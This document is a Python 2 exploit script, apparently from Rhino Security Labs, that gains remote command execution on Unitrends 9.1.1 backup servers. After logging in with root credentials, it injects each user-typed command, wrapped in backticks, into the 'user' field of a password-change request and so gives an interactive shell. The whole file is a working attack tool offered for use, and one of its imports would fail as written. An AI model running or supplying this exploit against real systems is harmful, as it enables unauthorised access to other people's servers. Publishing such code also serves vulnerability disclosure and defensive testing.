#!/usr/bin/python
import requests
import optparse
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib import base64, unquote

def main():
	parser = optparse.OptionParser("%prog -u https://url_to_unitrends_server.com -U root -P root_pass")
	parser.add_option("-U", dest="username", type="string", help="Username with root privledges to login to Admin interface.")
	parser.add_option("-u", dest="url", type="string", help="URL or IP of Unitrends server.")
	parser.add_option("-P", dest="password", type="string", help="Root user's password.")
	(options, args) = parser.parse_args()
	print "[+] Unitrends 9.1.1 RCE via Password Change Exploit"
	print "[+] Created by Dwight H. from Rhino Security Labs"
	if not options.url or not(options.username and options.password):
		print "[-] Not enough arguments given."
		return
	s = requests.Session()
	url = options.url
	if url[-1] == "/":
		url = url[:-1]
	login = {"username": options.username, "password": options.password}
	print "[+] Attempting to login with {}:{}".format(options.username, options.password)
	# Disable logging messages all the time
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	r = s.get(url, verify=False)
	r = s.post(url + "/api/login", data=json.dumps(login), verify=False)
	superuser_data = r.json()
	auth_string = superuser_data.get('auth_token')
	if auth_string:
		print "[+] Authentication successful."
	else:
		print "[-] Authentication not successful."
		return
	print "[+] Dropping into command prompt. (Note: No return value from command will be returned)"
	try:
		while True:
			cmd = raw_input("#> ")
			data = {
				"auth": auth_string,
				"newpassword": "blahblahblah",
				"password": login['password'],
				"user": "`{}`".format(cmd)
			}
			r = s.post(url + "/recoveryconsole/bpl/password.php?type=list&rx=8898009&ver=9.1.1&gcv=0", data=data, verify=False)
			print r.content
	except KeyboardInterrupt:
		print "\n[+] Exiting."

if __name__== "__main__":
	main()